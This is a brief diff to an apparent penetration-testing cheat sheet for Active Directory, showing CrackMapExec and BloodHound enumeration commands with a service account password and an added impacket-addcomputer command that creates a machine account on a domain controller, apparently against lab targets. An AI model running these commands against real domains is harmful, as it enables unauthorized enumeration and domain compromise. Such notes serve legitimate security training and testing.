@@ -136,3 +136,7 @@ cme ldap hokkaido-aerospace.com -u 'hrapp-service' -p 'Untimed$Runny' --bloodhou
 bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.208.40
 ```
 ---
+# Add Computer
+```bash
+impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -computer-pass Password@123 -dc-ip 192.168.1.14
+```
